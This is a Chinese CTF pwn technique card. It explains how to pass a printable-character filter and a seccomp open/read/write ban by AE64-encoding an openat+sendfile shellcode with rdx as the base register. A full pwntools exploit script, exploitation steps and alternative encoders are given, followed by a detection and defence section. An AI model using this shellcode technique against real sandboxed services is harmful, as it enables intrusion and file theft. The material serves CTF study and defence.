---
id: ctf-pwn-visible-char-ae64-rdx-base-openat-sendfile-orw
title: 入口是 call rdx 且只收可见字符：用 AE64 以 rdx 为基址寄存器编码，openat+sendfile 精简 ORW 读 flag
type: scenario
domain: ctf
path: ctf/pwn
technique: visible-char-ae64-rdx-base-openat-sendfile-orw
tags:
- ctf
- pwn
- shellcode
- ae64
- alphanumeric
- seccomp
- orw
- openat
- sendfile
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W8
  verified_at: '2026-11-09T02:41:06+08:00'
  notes: 已对照原文核对；本次核对未读取图片；正文明确「open read write 都被ban了 但是可以用openat 然后 r和w 可以用sendfile代替」「检测字符的大小在可见字符范围内 最后是call rdx执行我们输入的指令 由于读入0x150的字节是比较多的 而且寄存器是rdx 我们这里使用ae64 写orw」，与卡片的可见字符过滤 + call rdx 决定基址寄存器 + openat/sendfile 替代 + 0x150 长度上限四个要点一致；exp 中 AE64().encode(shellcode, rdx, 0, fast) 与卡内 PoC 一致。未验证点：seccomp 具体禁用的 syscall 列表只有「open read write 都被ban」这一句，卡内按 openat 与 sendfile 可用反推；checksec 与 seccomp dump 仅见于未读截图；卡内开放 AT_FDCWD 变体属补充建议，原文 dirfd 直接清零
url: /docs/ctf/pwn/ctf-pwn-visible-char-ae64-rdx-base-openat-sendfile-orw/
draft: false
kb_aliases:
- AE64 可见字符 shellcode
- call rdx 入口
- 基址寄存器必须匹配入口寄存器
- openat 被 ban 用 sendfile
- 字数限制 0x150 的 shellcode
---

## 一句话结论

题目把输入读进缓冲区后逐字节检查「必须落在可见字符范围」，然后用 `call rdx` 执行它；同时 seccomp 把 `open`/`read`/`write` 全部禁掉。要同时满足这两个约束，需要用 AE64 把 `openat`+`sendfile` 的短 ORW 编码成可打印串，并且**编码时指定的基址寄存器必须是 `rdx`**——因为解码器要依赖跳转瞬间指向缓冲区的那个寄存器来定位自己的数据，`call rdx` 意味着这个寄存器是 `rdx` 而不是常见的 `rax`。

## 原理

- **逐字节过滤只看字符，不看指令**：检查逻辑是「每个字节是否属于可见字符集」，它不反汇编、不理解语义；只要最终投递的字节全部可打印，检查就通过，真正的 `syscall`、寄存器操作由编码器在运行期还原。
- **编码器必须知道“运行时哪个寄存器指向自己”**：字母数字/可见字符编码器的解码器通常用一条固定的寄存器（基址寄存器）加上相对偏移来定位编码数据。`call rdx` 与 `jmp rsp` 不同——它跳的是 `rdx` 里存的地址，等价于约定「`rdx` 指向你即将执行的字节」。因此 AE64 的第二个参数必须给 `rdx`；写成 `rax` 会让解码器在一个无关地址上减偏移，直接崩溃或乱跳。
- **为什么必须做 ORW 而不是 execve**：seccomp 禁掉 `open`/`read`/`write`，说明预期解法是读文件而不是弹 shell；而 `open` 虽被 ban，`openat` 通常未被点名，`read`+`write` 可由 `sendfile` 一次完成（内核态在两个 fd 间搬数据）。这套替代组合是 seccomp 黑名单题的标准配法（判断过滤器是黑名单还是白名单的方法见关联卡）。
- **为什么要精简长度**：可见字符编码会膨胀（AE64 的 `fast` 模式已是最小膨胀），而读入上限只有 `0x150`；因此 shellcode 要避免逐字节填写路径字符串，改为把 `"/flag"` 压栈、用 `mov rsi, rsp` 取指针，并把文件 fd 直接写成常量（`openat` 返回的 fd 在小程序里通常是 3，直接 `mov rsi, 3` 省掉一次 mov）。
- **编码后必须自检**：`all(0x20 <= b < 0x7f)` 与 `len(payload) <= 0x150` 两条都要断言，否则要么被过滤拒绝、要么被截断成半条指令。

## 触发条件

- 程序把用户输入读进缓冲区后，在执行前做逐字节的「可见字符/字母数字」检查，并跳转执行（本例跳转指令为 `call rdx`）。
- 读入上限足够容纳编码膨胀后的 payload（本例 `0x150`）。
- seccomp 禁掉 `open`/`read`/`write`（或至少禁掉 `execve`），但放行 `openat` 与 `sendfile`；flag 文件对进程可读。
- 能确认跳转瞬间哪个寄存器指向缓冲区（决定编码器基址寄存器）。

## 利用步骤

1. 反汇编确认三点：读入长度、逐字节检查的字符集上下界、跳转指令（本例 `call rdx`）；用 `seccomp-tools dump ./pwn` 确认被禁 syscall 集合与默认分支。
2. 判定基址寄存器：`call rdx` → `rdx`；若为 `jmp rsp` 或 `call rax` 则相应换 `rsp`/`rax`。
3. 写最小 ORW 汇编：压入 `"/flag"` → `openat(dirfd, rsp, 0)` → `sendfile(1, fd, 0, 0x100)`；dirfd 用能在指令里低成本表达的常量，fd 直接用返回值或小常量。
4. 用 AE64 编码：`AE64().encode(shellcode, 'rdx', 0, 'fast')`（第二个参数即基址寄存器，与第 2 步一致；`fast` 模式给出最短膨胀）。
5. 断言 `<可见字符集>` 与长度上限，再发送；接收 stdout 上的 flag。
6. 若进程被杀，先用 `seccomp-tools`/`strace` 确认是否误用了被禁调用；若乱跳，优先怀疑基址寄存器填错（最常见）或编码后长度被截断。

## PoC

```python
from pwn import *
from ae64 import AE64
context(arch='amd64', os='linux')

io = remote(host, port)
io.recvuntil(b'Radiant powers, deadly tech. Here we go!\n')

# openat(dirfd, "/flag", 0) + sendfile(1, fd, 0, 0x100)
shellcode = asm('''
    mov rax, 0x67616c662f      ; "/flag" 小端
    push rax
    push 257                   ; SYS_openat
    pop rax
    mov rsi, rsp               ; path
    xor rdi, rdi               ; dirfd（见下方要点）
    xor rdx, rdx               ; flags = O_RDONLY
    xor r10, r10
    syscall
    mov r10d, 0x100            ; count
    mov rsi, rax               ; in_fd = openat 返回值
    push 40                    ; SYS_sendfile
    pop rax
    push 1
    pop rdi                    ; out_fd = stdout
    xor rdx, rdx               ; offset = 0
    syscall
''')

payload = AE64().encode(shellcode, 'rdx', 0, 'fast')   # 基址寄存器必须与 call 的寄存器一致
assert all(0x20 <= b < 0x7f for b in payload), 'enc payload must be printable'
assert len(payload) <= 0x150
io.send(payload)
io.interactive()
```

```text
要点：
1) 基址寄存器 = 跳转时的寄存器（call rdx -> 'rdx'），填错必然崩；
2) open/read/write 被禁 -> openat + sendfile；count 放 r10，offset 放 rdx，别搞反；
3) 编码长度必须 <= 读入上限，否则被截断成半条指令。
```

## 变体与关联

- **变体一（编码器换人）**：ALPHA3（`alpha3_encode.sh raw.bin alpha.txt rdx`）功能等价；RAVEN、msfvenom 的 alphanumeric encoder 也可，但都要给出正确的基址寄存器。
- **变体二（dirfd 的可移植写法）**：稳妥写法是 `AT_FDCWD = -100`（`xor rdi,rdi; sub rdi,100` 或在栈上压 `-100`），不依赖 `dirfd=0` 恰好可用；若 flag 路径含 `..` 或需绝对路径，务必用 `AT_FDCWD`。
- **变体三（sendfile 不可用时）**：换 `openat`+`readv`+`writev`，或用 `splice`/`copy_file_range`；若只放行 `write` 到已打开 fd，则用 `dup2`/`fcntl` 把 flag fd 复制到 stdout。
- **关联**：[[binary-pwn-sandbox-escape-alpha3-visible-shellcode-seccomp-orw]]（同为可见字符 shellcode 绕字节过滤，使用 ALPHA3 与 `rax` 基址、完整 ORW；本条的核心差异是基址寄存器由 `call rdx` 决定，且因 `open`/`read`/`write` 被禁而改用 `openat`+`sendfile`）、[[binary-pwn-sandbox-escape-seccomp-inverted-blocklist-openat-sendfile]]（判断 seccomp 是黑名单并选 `openat`+`sendfile` 组合的方法）、[[binary-pwn-sandbox-escape-minimal-shellcode-byte-budget-nul-free-scanf-badchar]]（长度预算与精简技巧）、[[binary-pwn-shellcode-byte-whitelist-imul-add-xor-shmget-orw]]（另一种字节白名单绕过：用算术指令现场合成 syscall）。

## 检测与防御

- **检测**：提交内容全为可打印字符但长度接近读入上限、且随后进程发起 `openat`/`sendfile` 序列，是字母数字 shellcode 的典型特征；可对「可执行内存中出现高熵可打印串」告警。
- **防御（题目/生产侧）**：不要只做字节集检查，应反汇编或模拟执行校验（拒绝可疑指令序列）；禁止 RWX 页，使用 W^X 加 JIT 白名单。
- **防御（seccomp 侧）**：seccomp 一律用白名单（默认 `KILL`，只放行业务所需 syscall），否则黑名单必然漏项；对读文件类调用再收紧参数（路径、fd）。
- **加固**：ASLR/PIE 让「跳转到固定缓冲区」更难；限制读入长度并强制末尾 NUL，避免超长编码串被截断后仍可执行。
